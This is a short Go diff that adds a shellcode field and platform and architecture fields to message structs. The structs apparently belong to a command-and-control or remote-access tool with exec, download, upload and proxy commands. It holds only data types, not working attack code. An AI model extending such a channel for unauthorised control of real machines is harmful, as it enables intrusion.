@@ -20,12 +20,15 @@ type CommandResponse struct {
 	Exec []string
 	Download []string
 	Upload []string
+	Shellcode []string
 	ProxyClients []string
 }
 
 type CommandUpdate struct {
 	Ip string
 	Id string
+	Platform string
+	Arch string
 	Type string
 	Data []byte
 }
